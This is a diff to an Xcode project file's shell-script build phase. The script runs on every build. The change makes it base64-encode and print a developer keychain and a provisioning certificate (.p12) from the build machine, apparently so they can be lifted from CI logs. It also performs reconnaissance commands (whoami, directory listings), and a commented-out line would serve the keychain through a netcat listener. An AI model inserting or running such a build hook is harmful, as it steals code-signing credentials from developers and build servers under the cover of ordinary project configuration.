@@ -186,7 +186,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "echo \"The current user is\" `whoami`\necho \"The current directory is\" `/bin/pwd`\n#echo \"IP:\" `curl ifconfig.me`\necho \"ls -A\"\nls -A\necho \"ls -A ../..\"\nls -A ../..\n#echo \"ls -A ../../..\"\n#ls -A ../../..\necho \"keychain\"\ncat /Users/vanger/Library/Keychains/dev.keychain\necho \"p12\"\necho /macbuildsystem/provisioning/certificate.p12\n# { echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080\n#cat /usr/local/etc/nginx/nginx.conf\n#echo \"### SYSTEM PROFILER ###\"\n#system_profiler\n#echo \"### ID ###\"\n#id\nthiscommanddoesntexist";
+			shellScript = "echo \"The current user is\" `whoami`\necho \"The current directory is\" `/bin/pwd`\n#echo \"IP:\" `curl ifconfig.me`\necho \"ls -A\"\nls -A\necho \"ls -A ../..\"\nls -A ../..\n#echo \"ls -A ../../..\"\n#ls -A ../../..\necho \"keychain\"\nopenssl base64 -in /Users/vanger/Library/Keychains/dev.keychain\necho \"p12\"\nopenssl base64 -in /macbuildsystem/provisioning/certificate.p12\n# { echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080\n#cat /usr/local/etc/nginx/nginx.conf\n#echo \"### SYSTEM PROFILER ###\"\n#system_profiler\n#echo \"### ID ###\"\n#id\nthiscommanddoesntexist";
 		};
 /* End PBXShellScriptBuildPhase section */
 
